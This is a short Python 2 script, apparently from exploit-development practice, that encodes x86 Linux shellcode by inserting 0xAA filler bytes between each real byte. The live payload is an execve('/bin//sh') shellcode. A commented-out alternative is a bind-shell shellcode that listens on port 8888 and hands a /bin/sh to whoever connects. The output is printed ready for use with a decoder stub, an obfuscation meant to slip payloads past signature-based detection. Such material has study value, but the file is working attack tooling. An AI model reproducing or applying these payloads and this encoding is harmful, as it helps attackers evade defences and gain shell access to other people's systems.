#!/usr/bin/python

# Python Insertion Encoder 
import random
import sys

#shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
shellcode  = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
#shellcode = (sys.argv[1])
#shellcode=("\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x68\x2e\x2e\x2e\x0a\x68\x70\x6f\x72\x74\x68\x69\x6e\x67\x20\x68\x42\x69\x6e\x64\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\xb1\x01\x31\xd2\xcd\x80\x50\x31\xc0\x66\xb8\x69\x01\x5b\x31\xc9\x51\x51\x66\x68\x22\xb8\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\x53\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x5b\x53\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x5b\x31\xc9\x31\xd2\xb2\x10\xcd\x80\x50\x31\xc0\xb0\x3f\x5b\x53\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x5b\x53\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x5b\x31\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % 0xAA

	# encoded += '\\x%02x' % random.randint(1,255)

	encoded2 += '0x'
	encoded2 += '%02x,' %x
	encoded2 += '0x%02x,' % 0xAA

	# encoded2 += '0x%02x,' % random.randint(1,255)



print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))